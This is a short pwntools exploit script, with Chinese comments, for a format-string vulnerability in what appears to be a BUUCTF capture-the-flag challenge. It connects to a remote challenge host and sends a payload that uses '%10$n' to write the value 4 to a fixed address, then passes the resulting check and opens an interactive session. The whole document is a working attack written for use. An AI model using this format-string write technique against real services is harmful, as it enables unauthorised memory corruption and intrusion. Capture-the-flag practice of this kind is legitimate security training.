from pwn import *

# r=process('./8')
r = remote('node5.buuoj.cn', 28650)

target = 0x0804c044
pay = p32(target) + b'%10$n'  # 由于在%10$n之前已经写入了0x804C044 为4字节,  因此%10$n:将%10n之前printf已经打印的字符个数"4"赋值给偏移处指针所指向的地址位置
r.recvuntil(':')
r.sendline(pay)
# gdb.attach(r)
r.recvuntil(':')
r.sendline(str(4))  # 写入了四字节，因此此处应写入4
r.interactive()
